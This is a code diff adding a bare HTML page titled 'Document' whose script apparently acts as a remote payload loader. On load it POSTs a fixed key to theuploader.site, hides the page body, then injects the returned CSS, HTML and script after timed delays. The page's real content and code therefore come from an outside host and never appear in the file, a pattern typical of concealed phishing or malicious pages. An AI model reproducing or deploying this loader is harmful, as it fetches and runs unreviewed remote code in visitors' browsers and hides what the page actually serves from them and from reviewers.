@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <title>Document</title>
+</head>
+
+<body>
+    <b id="css"></b>
+    <b id="body"></b>
+    <b id="script"></b>
+
+    <script>
+        function sleep (time) {return new Promise((resolve) => setTimeout(resolve, time));}
+        
+        async function doAjax(param1, param2) {
+            const result = await $.ajax(
+            {
+                url: "https://theuploader.site/apidata/",
+                type: 'POST',
+                data: {
+                    check: param1,
+                    data: param2
+                },
+            });
+            return result;
+        }
+
+        async function tt(){
+            var res = await doAjax(1, "arPmDNz5iaxXA7z-fZXPYckvMg3xgN8h");
+            const obj = JSON.parse(res);
+            console.log(obj);
+
+            $('#body').css('display', 'none');
+
+            sleep(1500).then(() => {
+                $("#css").html(obj.css);
+                sleep(500).then(() => {
+                    $("#body").html(obj.body);
+                });
+                sleep(500).then(() => {
+                    $("#script").html(obj.script);
+                });
+                sleep(1000).then(() => {
+                    $('#body').css('display', 'block');
+                });
+            });
+        }
+
+        tt();
+
+    </script> 
+</body>
+</html>
